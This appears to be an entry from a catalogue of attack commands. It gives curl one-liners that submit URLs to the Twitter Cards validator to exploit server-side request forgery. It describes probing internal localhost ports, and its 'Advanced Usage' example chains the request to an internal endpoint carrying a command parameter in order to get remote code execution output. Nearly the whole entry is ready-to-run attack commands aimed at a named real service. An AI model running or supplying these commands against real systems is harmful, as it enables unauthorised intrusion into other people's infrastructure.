---
id: cmd-uuid-1
data: >-
  curl -X POST https://cards-dev.twitter.com/validator -d
  'url=http://example.com'
tags:
  - ssrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.543Z'
verified: false
validated: true
submitted: true
---
# curl-submit-url-to-validator

## Command

```bash
curl -X POST https://cards-dev.twitter.com/validator -d 'url=http://0.0.0.0:PORT/PATH'
```

## Description

Submits a URL parameter to the Twitter Cards validator via POST to test SSRF by fetching internal resources. Use for probing localhost ports and paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d 'url=...'` | URL to fetch (e.g., http://0.0.0.0:123) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://cards-dev.twitter.com/validator -d 'url=http://0.0.0.0:123'
```

### Advanced Usage

```bash
curl -X POST https://cards-dev.twitter.com/validator -d 'url=http://0.0.0.0:4680/system/command.php?command=id' -v
```
(Use -v for verbose output to inspect responses.)

## Expected Output

HTML response from validator including fetched content, metatags, or error messages (e.g., "Connection refused" for closed ports, command output for RCE).

## Related

- [[Related Procedure]]
